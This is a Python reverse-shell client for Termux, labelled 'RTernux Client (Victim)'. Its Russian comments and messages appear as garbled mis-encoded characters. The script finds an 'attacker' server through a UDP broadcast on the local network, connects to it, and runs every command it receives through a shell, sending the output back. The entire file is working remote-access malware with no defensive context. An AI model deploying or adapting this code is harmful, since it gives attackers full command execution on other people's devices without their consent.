#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import time

print("""
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë           RTernux Client (Victim)                ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
""")

def discover_server():
    """–ò—â–µ–º —Å–µ—Ä–≤–µ—Ä –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ –≤ –ª–æ–∫–∞–ª—å–Ω–æ–π —Å–µ—Ç–∏"""
    print("üîç –ü–æ–∏—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ –≤ –ª–æ–∫–∞–ª—å–Ω–æ–π —Å–µ—Ç–∏...")
    
    listen_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    listen_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_socket.settimeout(10)
    
    try:
        listen_socket.bind(('', 7157))
        
        print("üì° –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–µ—Ç–∏...")
        for i in range(30):
            try:
                data, addr = listen_socket.recvfrom(1024)
                message = data.decode()
                
                if message.startswith("RTernux:"):
                    parts = message.split(":")
                    if len(parts) >= 3:
                        server_ip = parts[2]
                        server_port = int(parts[1])
                        print(f"‚úÖ –ù–∞–π–¥–µ–Ω —Å–µ—Ä–≤–µ—Ä: {server_ip}:{server_port}")
                        listen_socket.close()
                        return server_ip, server_port
                        
            except socket.timeout:
                print(f"‚è≥ –ü–æ–∏—Å–∫... ({i+1}/30)")
                continue
                
    except Exception as e:
        print(f"‚ö†Ô∏è  –û—à–∏–±–∫–∞ –ø–æ–∏—Å–∫–∞: {e}")
    
    listen_socket.close()
    return None, None

def connect_to_server(server_ip, server_port=7156):
    """–ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É"""
    print(f"\nüîó –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ {server_ip}:{server_port}...")
    
    for attempt in range(1, 6):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((server_ip, server_port))
            
            welcome = sock.recv(1024).decode()
            print(f"‚úÖ –£–°–ü–ï–®–ù–û –ü–û–î–ö–õ–Æ–ß–ï–ù–û!")
            print(f"üì© {welcome}")
            print(f"\n‚ö†Ô∏è  –í–ù–ò–ú–ê–ù–ò–ï: –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –ø–æ–ª—É—á–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≤–∞—à–µ–º—É Termux!")
            print("="*60)
            
            return sock
            
        except ConnectionRefusedError:
            print(f"‚ùå –ü–æ–ø—ã—Ç–∫–∞ {attempt}/5: –°–µ—Ä–≤–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω")
            time.sleep(2)
        except socket.timeout:
            print(f"‚ùå –ü–æ–ø—ã—Ç–∫–∞ {attempt}/5: –¢–∞–π–º–∞—É—Ç")
            time.sleep(2)
        except Exception as e:
            print(f"‚ùå –ü–æ–ø—ã—Ç–∫–∞ {attempt}/5: {e}")
            time.sleep(2)
    
    return None

def execute_command(command):
    """–í—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –∂–µ—Ä—Ç–≤—ã"""
    try:
        # –õ–æ–≥–∏—Ä—É–µ–º –∫–æ–º–∞–Ω–¥—É (–≤ –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ Termux)
        log_path = os.path.join(os.path.expanduser("~"), ".rternux.log")
        try:
            with open(log_path, "a") as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {command}\n")
        except:
            pass  # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
        
        # –û–±—Ä–∞–±–æ—Ç–∫–∞ cd
        if command.strip().startswith('cd '):
            path = command.strip()[3:].strip()
            if not path:
                path = os.path.expanduser("~")
            try:
                os.chdir(path)
                return f"–¢–µ–∫—É—â–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è: {os.getcwd()}\n__END__"
            except Exception as e:
                return f"–û—à–∏–±–∫–∞: {e}\n__END__"
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É
        try:
            process = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                cwd=os.getcwd(),
                timeout=30
            )
            
            result = process.stdout
            if process.stderr:
                if result:
                    result += f"\n–û—à–∏–±–∫–∞: {process.stderr}"
                else:
                    result = f"–û—à–∏–±–∫–∞: {process.stderr}"
            
            if not result:
                result = "‚úÖ –ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞"
            
            return result + "\n__END__"
            
        except subprocess.TimeoutExpired:
            return "‚ùå –¢–∞–π–º–∞—É—Ç (30 —Å–µ–∫—É–Ω–¥)\n__END__"
        except Exception as e:
            return f"‚ùå –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {str(e)}\n__END__"
        
    except Exception as e:
        return f"‚ùå –û–±—â–∞—è –æ—à–∏–±–∫–∞: {str(e)}\n__END__"

def victim_main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∂–µ—Ä—Ç–≤—ã"""
    # –ò—â–µ–º —Å–µ—Ä–≤–µ—Ä –≤ —Å–µ—Ç–∏
    server_ip, server_port = discover_server()
    
    if not server_ip:
        print("‚ùå –°–µ—Ä–≤–µ—Ä –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –ª–æ–∫–∞–ª—å–Ω–æ–π —Å–µ—Ç–∏")
        print("–£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –∑–∞–ø—É—Å—Ç–∏–ª server.py")
        return
    
    # –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É
    sock = connect_to_server(server_ip, server_port)
    if not sock:
        print("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è")
        return
    
    print("üéÆ –†–µ–∂–∏–º –∂–µ—Ä—Ç–≤—ã –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω")
    print("–í—Å–µ –∫–æ–º–∞–Ω–¥—ã –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞ –±—É–¥—É—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è\n")
    
    try:
        while True:
            try:
                sock.settimeout(0.5)
                
                try:
                    data = sock.recv(4096)
                except socket.timeout:
                    continue
                
                if not data:
                    print("‚ùå –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Ä–∞–∑–æ—Ä–≤–∞–Ω–æ")
                    break
                
                command = data.decode().strip()
                
                # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –≤—ã—Ö–æ–¥
                if command.lower() == 'exit':
                    print("üëã –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –æ—Ç–∫–ª—é—á–∏–ª—Å—è")
                    sock.send("–°–µ—Å—Å–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞\n__END__".encode())
                    break
                
                # –í—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É
                result = execute_command(command)
                
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
                sock.send(result.encode())
                
            except ConnectionResetError:
                print("‚ùå –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —Å–±—Ä–æ—à–µ–Ω–æ")
                break
            except KeyboardInterrupt:
                print("\n‚ö†Ô∏è  –û—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –∂–µ—Ä—Ç–≤–æ–π")
                sock.send("–ö–ª–∏–µ–Ω—Ç –æ—Ç–∫–ª—é—á–µ–Ω\n__END__".encode())
                break
            except Exception as e:
                print(f"‚ö†Ô∏è  –û—à–∏–±–∫–∞: {e}")
                continue
                
    finally:
        sock.close()
        print("\nüëã –û—Ç–∫–ª—é—á–µ–Ω–æ –æ—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞")

if __name__ == "__main__":
    victim_main()
